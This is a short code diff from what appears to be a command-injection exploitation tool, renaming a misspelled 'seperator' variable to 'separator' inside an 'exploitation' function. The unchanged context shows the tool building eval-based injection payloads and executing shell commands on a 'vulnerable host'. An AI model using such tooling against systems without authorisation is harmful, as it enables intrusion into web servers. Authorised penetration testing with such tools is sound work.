@@ -56,10 +56,10 @@ def exploitation(url,delay,filename,http_request_method):
   
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
-      for seperator in settings.SEPERATORS:
+      for separator in settings.SEPARATORS:
 	
-	# Check for bad combination of prefix and seperator
-	combination = prefix + seperator
+	# Check for bad combination of prefix and separator
+	combination = prefix + separator
 	if combination in settings.JUNK_COMBINATION:
 	  prefix = ""
 		
@@ -76,7 +76,7 @@ def exploitation(url,delay,filename,http_request_method):
 	try:
 	  
 	  # Eval-based decision payload (check if host is vulnerable).
-	  payload = eval_payloads.decision(seperator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
+	  payload = eval_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
 	  
 	  # Check if defined "--prefix" option.
 	  if menu.options.prefix:
@@ -100,7 +100,7 @@ def exploitation(url,delay,filename,http_request_method):
 	  
 	  # Check if defined "--verbose" option.
 	  if menu.options.verbose:
-	    if seperator == ";":
+	    if separator == ";":
 	      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
 	      
 	  # Check if defined method is GET (Default).
@@ -259,7 +259,7 @@ def exploitation(url,delay,filename,http_request_method):
 		else:
 		  
 		  # Execute shell commands on vulnerable host.
-		  payload = eval_payloads.cmd_execution(seperator,TAG,cmd)
+		  payload = eval_payloads.cmd_execution(separator,TAG,cmd)
 		  
 		  payload = re.sub(" ","%20", payload)
 
